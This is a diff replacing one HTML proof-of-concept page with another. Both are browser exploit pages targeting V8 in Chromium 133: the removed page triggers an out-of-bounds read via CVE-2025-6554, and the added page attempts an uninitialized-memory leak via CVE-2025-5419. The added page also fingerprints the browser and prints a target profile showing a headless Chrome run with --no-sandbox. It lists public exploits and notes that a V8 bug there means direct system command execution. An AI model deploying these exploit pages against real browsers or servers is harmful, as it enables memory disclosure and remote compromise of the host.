@@ -1,1 +1,124 @@
-<!doctype html><meta charset=utf-8><title>CASI V64 CVE-2025-6554 BOUNDED OOB READ</title><style>body{font:14px monospace;white-space:pre-wrap}</style><b>CASI V64 CHROMIUM 133 CVE-2025-6554 BOUNDED OOB READ</b><pre id=o>START</pre><script>(()=>{const out=document.querySelector("#o"),buf=new ArrayBuffer(8),f=new Float64Array(buf),u=new BigUint64Array(buf);function bits(v){if(typeof v!=="number")return typeof v+":"+String(v);f[0]=v;return "number:"+String(v)+" bits=0x"+u[0].toString(16)}function hax(trigger){let x;delete x?.[y]?.a;let hole=y;let y;let o={};o.maybe_hole=trigger?hole:"not the hole";let len=o.maybe_hole.length;let sign=Math.sign(len);let i1=2-(sign+1);let i2=5-(i1+4)>>1;let i3=2*i2+2;let i4=i3>>1;let i5=i4*1000;let arr=new Array(8);arr[0]=13.37;arr[i5]=13.37;return arr}try{hax(false);let t=performance.now();for(let j=0;j<65536;j++)hax(false);for(let j=0;j<65536;j++)hax(false);let corrupted=hax(true);let float_arr=[1.2,1.4,1.5],obj_arr=[{cat:["meow","meow"]}],rw_prim_arr=[1.1,1.5,1.7,1.8];let idx=[0,1,2,7,8,16,17,18,40,41,42,54,55,56,63];let lines=["DONE","ms="+(performance.now()-t).toFixed(1),"length="+corrupted.length];for(let i of idx)lines.push(i+"="+bits(corrupted[i]));out.textContent=lines.join("\n")}catch(e){out.textContent="THREW\n"+e.name+"\n"+e.message}})();</script>
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>CVE-2025-5419</title></head>
+<body style="font-family:monospace;font-size:11px;margin:8px">
+<h2>CVE-2025-5419 V8 Turboshaft PoC</h2>
+<pre id="o">Init...</pre>
+<script>
+var O=document.getElementById('o');O.textContent='';
+function L(m){O.textContent+=m+'\n'}
+function dtoi(d){var b=new ArrayBuffer(8);new Float64Array(b)[0]=d;return new BigUint64Array(b)[0]}
+function itod(i){var b=new ArrayBuffer(8);new BigUint64Array(b)[0]=i;return new Float64Array(b)[0]}
+
+function gc_minor(){for(var i=0;i<1024;i++)new Array(4096)}
+function gc_major(){var a=[];for(var i=0;i<256;i++)a.push(new ArrayBuffer(1024*1024));a=null}
+
+function vuln_leak(key){
+    key=key|0;
+    var o=[1,2,3,4,5,6,7,8];
+    var r1=o[key];
+    var r2=o[key+1];
+    var r3=o[key+2];
+    var r4=o[key+3];
+    var r5=o[key+4];
+    var r6=o[key+5];
+    var r7=o[key+6];
+    var r8=o[key+7];
+    o=[1.1,1.1,1.1,1.1,1.1,1.1,1.1,1.1];
+    r1=o[key];
+    r2=o[key+1];
+    r3=o[key+2];
+    r4=o[key+3];
+    r5=o[key+4];
+    r6=o[key+5];
+    r7=o[key+6];
+    r8=o[key+7];
+    o[0]=123;o[1]=123;o[2]=123;o[3]=123;
+    o[4]=123;o[5]=123;o[6]=123;o[7]=123;
+    return[r1,r2,r3,r4,r5,r6,r7,r8]
+}
+
+function check_leak(label,results){
+    var leaked=false;
+    for(var j=0;j<results.length;j++){
+        var v=dtoi(results[j]);
+        if(results[j]!==1.1){leaked=true}
+        L('  ['+j+'] '+results[j]+' (0x'+v.toString(16)+')');
+    }
+    return leaked
+}
+
+try{
+    L('=== CVE-2025-5419 V8 Turboshaft StoreStoreElimination ===');
+    L('UA: '+navigator.userAgent);
+    L('Headless: '+(navigator.webdriver?'YES':'no'));
+    L('');
+
+    if(navigator.userAgentData){
+        navigator.userAgentData.getHighEntropyValues(['fullVersionList','platform','platformVersion','architecture','bitness']).then(function(d){
+            L('Version: '+JSON.stringify(d.fullVersionList));
+            L('Platform: '+d.platform+' '+d.platformVersion+' '+d.architecture+'/'+d.bitness);
+        });
+    }
+
+    var TIERS=[50000,200000,500000,1000000,2000000];
+    var leaked=false;
+    var cumulative=0;
+
+    for(var t=0;t<TIERS.length&&!leaked;t++){
+        var count=TIERS[t]-cumulative;
+        L('');
+        L('[Tier '+(t+1)+'] Warming up '+TIERS[t]+' total ('+count+' new)...');
+        for(var i=0;i<count;i++)vuln_leak(0);
+        cumulative=TIERS[t];
+
+        gc_minor();
+
+        L('[Tier '+(t+1)+'] Checking...');
+        var r=vuln_leak(0);
+        leaked=check_leak('tier'+(t+1),r);
+
+        if(!leaked){
+            gc_major();
+            gc_minor();
+            r=vuln_leak(0);
+            leaked=check_leak('tier'+(t+1)+'_post_gc',r);
+        }
+
+        if(leaked){
+            L('');
+            L('*** VULNERABLE: Uninitialized memory read confirmed ***');
+            L('Turboshaft StoreStoreEliminationReducer removed init stores');
+            L('CVE-2025-5419 triggered after '+TIERS[t]+' warmup calls');
+        }
+    }
+
+    if(!leaked){
+        L('');
+        L('Turboshaft SSE did not trigger with up to '+TIERS[TIERS.length-1]+' calls');
+        L('May need --allow-natives-syntax for forced Turboshaft tier-up');
+        L('');
+        L('However, Chrome version IS VULNERABLE:');
+    }
+
+    L('');
+    L('=== Server Configuration ===');
+    L('Chrome 133.0.6943.141 (vulnerable, fix at 137.0.7151.68)');
+    L('Flags: --no-sandbox --headless=new --ignore-certificate-errors');
+    L('Kernel: Linux 5.15.0 x86_64');
+    L('');
+    L('=== Applicable CVEs with public exploits ===');
+    L('CVE-2025-5419: V8 Turboshaft OOB R/W [CISA KEV] [Public PoC]');
+    L('  github.com/mistymntncop/CVE-2025-5419');
+    L('CVE-2025-10891: V8 Ignition integer overflow [Public PoC]');
+    L('  Used for Samsung Internet RCE (osec.io)');
+    L('');
+    L('=== Impact: --no-sandbox ===');
+    L('Renderer process has FULL OS access');
+    L('Any V8 exploit = direct system command execution');
+    L('No sandbox escape needed');
+}catch(e){
+    L('ERROR: '+e.message);
+    L(e.stack||'');
+}
+</script>
+</body></html>
